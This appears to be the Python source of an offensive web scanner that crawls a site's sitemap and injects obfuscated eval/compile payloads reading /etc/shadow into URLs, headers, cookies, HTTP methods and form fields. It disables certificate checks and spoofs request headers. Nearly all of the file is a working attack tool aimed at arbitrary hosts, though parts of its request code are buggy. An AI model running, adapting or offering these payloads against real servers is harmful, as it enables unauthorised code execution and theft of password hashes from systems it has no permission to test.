import random
import re
import ssl
import threading
import time
import urllib.parse
import urllib.request
from TheSilent.clear import clear
from TheSilent.return_user_agent import return_user_agent

verify = ssl.create_default_context()
verify.check_hostname = False
verify.verify_mode = ssl.CERT_NONE

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

payload_list = []

def melon_thread(host,delay):
    global payload_list

    mal_python = [r"eval(compile('import os\nos.system(\'/etc/shadow\')', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\nos.system(base64.b64decode(b\'Y2F0IC9ldGMvc2hhZG93\'))', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\nos.system(base64.b32decode(b\'MNQXIIBPMV2GGL3TNBQWI33X\'))', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\nos.system(base64.b16decode(b\'636174202F6574632F736861646F77\'))', 'melon', 'exec'))",
                  r"eval(compile('import os\ndef melon():\n    data = open(\'/etc/shadow\',\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b64decode(b\'L2V0Yy9zaGFkb3c=\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b32decode(b\'F5SXIYZPONUGCZDPO4======\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))",
                  r"eval(compile('import os, base64\ndef melon():\n    data = open(base64.b16decode(b\'2F6574632F736861646F77\'),\'r\')\n    data = data.read()\n    return data\nmelon()', 'melon', 'exec'))"
                  ]

    # test for python injection in url
    for mal in mal_python:
        time.sleep(delay)
        try:
            if not host.endswith("/"):
                my_request = urllib.request.Request(host + f"/{urllib.parse.quote(mal)}", method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"url: {mal}")

            else:
                my_request = urllib.request.Request(host + f"{urllib.parse.quote(mal)}", method="GET")
                my_request.add_header("User-Agent",return_user_agent())
                my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                my_request.add_header("Accept-Encoding","deflate")
                my_request.add_header("Accept-Language","en-US,en;q=0.5")
                my_request.add_header("Referer","https://www.google.com/")
                my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                    payload_list.append(f"url: {mal}")

        except:
            continue

    # test for python injection in headers
    time.sleep(delay)
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            my_request.add_header(mal,mal)
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"headers: {mal}")

        except:
            continue
        
    # test for python injection in cookie
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            my_request.add_header("Cookie",mal)
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"cookie: {mal}")

        except:
            continue

    # test for python injection in method
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method=mal)
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                payload_list.append(f"method: {mal}")

        except:
            continue

    # test for python injection in forms
    form_list = []
    for mal in mal_python:
        time.sleep(delay)
        try:
            my_request = urllib.request.Request(host, method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            input_form = re.findall("<input.+>", simple_response.lower())
            method = re.findall("method.?=.?[\"\'](\S+)[\"\']", simple_response.lower())[0]
            for field in input_form:
                form_id = re.findall("id.?=.?[\"\'](\S+)[\"\']", field.lower())[0]
                form_name = re.findall("name.?=.?[\"\'](\S+)[\"\']", field.lower())[0]
                form_list.append(form_id)
                form_list.append(form_name)

            form_list = list(set(form_list))
            form_list.sort()
            for field in form_list:
                time.sleep(delay)
                if method == "get":
                    my_request = urllib.request.Request(host, method="GET")
                    my_request.add_header("User-Agent",return_user_agent())
                    my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                    my_request.add_header("Accept-Encoding","deflate")
                    my_request.add_header("Accept-Language","en-US,en;q=0.5")
                    my_request.add_header("Referer","https://www.google.com/")
                    my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                    simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                    if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                        payload_list.append(f"forms: {mal}")

                if method == "post":
                    my_request = urllib.request.Request(host, method="POST")
                    my_request.add_header("User-Agent",return_user_agent())
                    my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                    my_request.add_header("Accept-Encoding","deflate")
                    my_request.add_header("Accept-Language","en-US,en;q=0.5")
                    my_request.add_header("Referer","https://www.google.com/")
                    my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                    simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                    simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                    if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                        payload_list.append(f"forms: {mal}")

                if method == "put":
                    my_request = urllib.request.Request(host, method="PUT")
                    my_request.add_header("User-Agent",return_user_agent())
                    my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                    my_request.add_header("Accept-Encoding","deflate")
                    my_request.add_header("Accept-Language","en-US,en;q=0.5")
                    my_request.add_header("Referer","https://www.google.com/")
                    my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
                    simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
                    simple_response = str(urllib.request.urlopen(my_request,context=verify,data={field:mal},timeout=15).read())
                    if "root" in simple_response.lower() and "daemon" in simple_response.lower():
                        payload_list.append(f"forms: {field}:{mal}")

        except:
            continue

def melon_scanner(url="",delay=0):
    global payload_list

    clear()

    if url.endswith(".txt"):
        host_list = []
        with open(url, "r") as file:
            for line in file:
                line = line.replace("\n", "")
                host_list.append(line)

    else:
        host_list = [url]

    init_host_list = host_list[:]

    for host in init_host_list:
        try:
            print(CYAN + f"checking for sitemap on: {host}")
            my_request = urllib.request.Request(host + "/sitemap.xml", method="GET")
            my_request.add_header("User-Agent",return_user_agent())
            my_request.add_header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
            my_request.add_header("Accept-Encoding","deflate")
            my_request.add_header("Accept-Language","en-US,en;q=0.5")
            my_request.add_header("Referer","https://www.google.com/")
            my_request.add_header("UPGRADE-INSECURE-REQUESTS","1")
            simple_response = str(urllib.request.urlopen(my_request,context=verify,timeout=15).read())
            xml_list = re.findall("http\S+<", simple_response)
            for xml in xml_list:
                result = xml.split("<")[0]
                result = result.split("'")[0]
                result = result.split('"')[0]
                result = re.sub("/$", "", result)
                host_list.append(result)

        except:
            continue

    host_list = list(set(host_list[:]))
    host_list.sort()
    thread_list = []

    print(CYAN + "checking for python injection")
    for host in host_list:
        my_thread = threading.Thread(target=melon_thread, args=[host,delay])
        thread_list.append(my_thread)

    for thread in enumerate(thread_list):
        thread[1].start()
        if thread[0] % 8 == 0:
            thread[1].join()
            

    payload_list = list(set(payload_list[:]))
    payload_list.sort()
    clear()
    
    return payload_list
